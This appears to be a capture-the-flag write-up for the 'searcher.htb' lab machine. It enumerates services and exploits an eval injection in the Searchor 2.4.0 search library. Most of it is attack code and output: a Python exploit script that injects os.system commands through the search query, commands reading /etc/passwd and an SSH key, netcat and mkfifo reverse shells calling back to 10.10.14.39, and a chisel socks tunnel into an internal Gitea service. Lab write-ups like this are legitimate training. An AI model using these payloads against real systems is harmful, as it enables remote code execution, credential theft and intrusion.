## Enum
```
nmap -sC -sV 10.10.11.208 -oN scans/nmap.initial
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 09:30 IST
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds
```

```
dirsearch -r -u http://searcher.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/searcher.htb/_23-05-01_09-36-48.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-05-01_09-36-48.log

Target: http://searcher.htb/

[09:36:48] Starting:
[09:37:24] 405 -  153B  - /search
[09:37:24] 403 -  277B  - /server-status/     (Added to queue)
[09:37:24] 403 -  277B  - /server-status
[09:37:31] Starting: server-status/
[09:37:31] 404 -  207B  - /server-status/%2e%2e//google.com

Task Completed
```

```
curl -I -X POST http://searcher.htb/search
HTTP/1.1 200 OK
Date: Mon, 01 May 2023 08:49:00 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Content-Length: 13534
Vary: Accept-Encoding
```

```
Powered by Flask and Searchor 2.4.0
```

[https://github.com/ArjunSharda/Searchor](https://github.com/ArjunSharda/Searchor)  
[PR](https://github.com/ArjunSharda/Searchor/pull/130/files/29d5b1f28d29d6a282a5e860d456fab2df24a16b)  


```
git clone https://github.com/ArjunSharda/Searchor.git
```

Building the docker container to start experimenting with the library
```python
>>> from searchor import Engine
>>> engine="Youtube"
>>> query="hi"
>>> f"Engine.{engine}.search('{query}')"
"Engine.Youtube.search('hi')"
>>> eval(f"Engine.{engine}.search('{query}')")
'https://www.youtube.com/results?search_query=hi'
>>> query="'),dir(),print('"
>>> f"Engine.{engine}.search('{query}')"
"Engine.Youtube.search(''),dir(),print('')"
>>> eval(f"Engine.{engine}.search('{query}')")

('https://www.youtube.com/results?search_query=', ['Engine', '__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'engine', 'query'], None)
```

The older version didn't have the docker container, but no big deal, lets just make a virtual environment, and install the tool
```bash
git checkout b5e67ec
python3 -m venv venv
source venv/bin/activate
pip install .
```

We know the eval is beeing called whan using the cli like this:
```bash
searchor search Youtube 'hamsters'
https://www.youtube.com/results?search_query=hamsters
```

Playing around to get command execution
```python
>>> engine="Youtube"
>>> open=False
>>> copy=False
>>> query="'),dir(),Engine.Youtube.search('"
>>> f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
"Engine.Youtube.search(''),dir(),Engine.Youtube.search('', copy_url=False, open_web=False)"
>>> eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
('https://www.youtube.com/results?search_query=', ['Engine', '__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'copy', 'engine', 'open', 'open_web', 'query'], 'https://www.youtube.com/results?search_query=')
```

So if we do that from the cli that should work too
```bash
searchor search Youtube "'),dir(),Engine.Youtube.search('"
('https://www.youtube.com/results?search_query=', ['copy', 'engine', 'open', 'query'], 'https://www.youtube.com/results?search_query=')
```

And it does, so assuming that the webapp calls the that same function in the main somehow, it should give us RCE this way
```bash
curl -X POST \
  http://searcher.htb/search \
  -d 'engine=Youtube&query=%27%29%2Cdir%28%29%2CEngine.Youtube.search%28%27'

('https://www.youtube.com/results?search_query=', ['copy', 'engine', 'open', 'query'], 'https://www.youtube.com/results?search_query=')
```

eval, is a bit inconvenient, as we can't really separate our statements with semicolons,  
So I ended up finding a stack overflow post suggesting to call os.system to do a netcat reverse shell
And the nc shell itself didn't work, but I could start playing with that:
```bash
'),__import__('os').system('nc 10.10.14.39 4242 -e /bin/sh'),Engine.Youtube.search('
'),__import__('os').system('ping -c3 10.10.14.39'),Engine.Youtube.search('
'),__import__('os').system('cat /etc/passwd'),Engine.Youtube.search('
'),__import__('os').system('pwd'),Engine.Youtube.search('
```

Let's make a quick exploit script
```python
import sys
import requests
from urllib.parse import quote, urlencode, quote_plus

cmd = sys.argv[1]
url = "http://searcher.htb/search"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*"
}
payload = f"'),__import__('os').system('{cmd}'),Engine.Youtube.search('"
encoded = quote(payload, safe="")
data = f"engine=Youtube&query={encoded}"

res = requests.post(url, headers=headers, data=data)
print(res.status_code)
print(res.text)
```

```
python3 tool.py "id"
200
uid=1000(svc) gid=1000(svc) groups=1000(svc)
('https://www.youtube.com/results?search_query=', 0, 'https://www.youtube.com/results?search_query=')

python3 tool.py "pwd"
200
/var/www/app
('https://www.youtube.com/results?search_query=', 0, 'https://www.youtube.com/results?search_query=')

python3 tool.py "cat /etc/passwd"|grep sh$
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash

python3 tool.py "cat /home/svc/.ssh/id_rsa"
200
('https://www.youtube.com/results?search_query=', 256, 'https://www.youtube.com/results?search_query=')
```

After throwing a few revshels form revshells.com, finally got one to stick
```
python3 tool.py "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.39 4242 >/tmp/f"
```

Getting the user flag, and dropping an authorized keys in ~svc to get a propper shell
```
$ cd
$ pwd
/home/svc
$ wc -c user.txt
```

Just checking the app to see if our assumption was correct
```bash
svc@busqueda:/var/www/app$ vim app.py
```

And yea, it is a super simple flask app, that calls the cli of searchor through subprocess, triggering the vulnerable code in main
```python
from flask import Flask, render_template, request, redirect
from searchor import Engine
import subprocess


app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', options=Engine.__members__, error='')

@app.route('/search', methods=['POST'])
def search():
    try:
        engine = request.form.get('engine')
        query = request.form.get('query')
        auto_redirect = request.form.get('auto_redirect')

        if engine in Engine.__members__.keys():
            arg_list = ['searchor', 'search', engine, query]
            r = subprocess.run(arg_list, capture_output=True)
            url = r.stdout.strip().decode()
            if auto_redirect is not None:
                return redirect(url, code=302)
            else:
                return url

        else:
            return render_template('index.html', options=Engine.__members__, error="Invalid engine!")

    except Exception as e:
        print(e)
        return render_template('index.html', options=Engine.__members__, error="Something went wrong!")

if __name__ == '__main__':
    app.run(debug=False)
```


## Privesc

```
svc@busqueda:~$ netstat -tulpen
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.1:43439         0.0.0.0:*               LISTEN      0          35379      -
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1000       733356     245982/python3
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      0          38537      -
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      0          38453      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      0          37321      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1000       38681      1657/python3
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        32241      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          36235      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          35309      -
tcp6       0      0 :::80                   :::*                    LISTEN      0          36260      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        32240      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          32286      -
```

```
svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:43439
HTTP/1.1 404 Not Found
Date: Mon, 01 May 2023 11:28:17 GMT
Content-Length: 19
Content-Type: text/plain; charset=utf-8

svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:5000
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.6
Date: Mon, 01 May 2023 11:28:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13519
Connection: close

svc@busqueda:/var/www/app$ curl -I http://127.0.0.1:3000
HTTP/1.1 200 OK
Set-Cookie: i_like_gitea=1785a26bfd1cd4f4; Path=/; HttpOnly; SameSite=Lax
Date: Mon, 01 May 2023 11:28:27 GMT
```

So there's a gitea instance, probably not pointing to the flask app though
```bash
svc@busqueda:/var/www/app$ git config --global --add safe.directory /var/www/app
svc@busqueda:/var/www/app$ git log --oneline
5ede9ed (HEAD -> main, origin/main) Initial commit
```

Lets setup some socks5 proxy with chisel
```bash
local # ./chisel-arm server -p 4242 --socks5 --reverse
remote # ./chisel-amd client 10.10.14.39:4242 R:1080:socks
```
```bash
local # curl -x socks5://localhost:1080 -I http://127.0.0.1:3000
HTTP/1.1 200 OK
Set-Cookie: i_like_gitea=f5aafbf458b1e8de; Path=/; HttpOnly; SameSite=Lax
Date: Mon, 01 May 2023 11:37:38 GMT
```
Making a quick foxyproxy config, and we're all set
![foxy.png](foxy.png)  
![root.png](root.png)  


